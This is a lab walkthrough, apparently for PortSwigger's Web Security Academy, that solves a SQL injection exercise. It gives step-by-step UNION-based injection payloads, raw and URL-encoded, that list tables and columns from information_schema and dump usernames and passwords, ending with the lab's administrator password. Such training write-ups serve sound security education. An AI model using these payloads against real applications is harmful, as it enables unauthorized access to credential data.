
# SQL injection attack, listing the database contents on non-Oracle databases

## This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

___
**HINT:**
![screnshot](lab9_listing_content_of_database.jpg)

`SELECT * FROM information_schema.tables--`  => for table like `Product`,`Users` etc
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'` => for `UserId`, `Password`

step 1

select any category then go to
burpsuite => proxy => http history => click on =>`/filter?category=pets` => send to repeater

![screnshot](lab9_category_pets.jpg)

step 2

`SELECT * FROM information_schema.tables--`
you can rewrite payload using UNION
```sql
' UNION SELECT NULL,TABLE_NAME FROM information_schema.tables--
```

convert to URL Encoded
```sql
'+UNION+SELECT+NULL,TABLE_NAME+FROM+information_schema.tables--
```

`/filter?category=Pets'+UNION+SELECT+NULL,TABLE_NAME+FROM+information_schema.tables--`

![screnshot](lab9_user_table.jpg)

Table => `users_xqqeus`

step 3

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
Rewrite payload using UNION
```sql
' UNION SELECT NULL,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_xqqeus'--
```

convert to URL Encoded
```sql
'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name+%3d+'users_xqqeus'--
```

`/filter?category=Pets'+UNION+SELECT+NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name+%3d+'users_xqqeus'--`

![screnshot](lab9_user_id_password.jpg)

User-id => `username_wifoyz` Password => `password_jipwdz`

step 4

`SELECT * FROM Users`
Rewrite payload using UNION
```sql
' UNION SELECT username_wifoyz,password_jipwdz FROM users_xqqeus--
```

convert to URL Encoded
```sql
'+UNION+SELECT+username_wifoyz,password_jipwdz+FROM+users_xqqeus--
```

`/filter?category=Pets'+UNION+SELECT+username_wifoyz,password_jipwdz+FROM+users_xqqeus--`

![screnshot](lab9_administrator_password.jpg)


step 5

To solve the lab use administrator id and password
```html
<tr>
	<th>administrator</th>
	<td>ete87avuw1cw7826f8ec</td>
</tr>
```

![screnshot](lab9_solved_lab.jpg)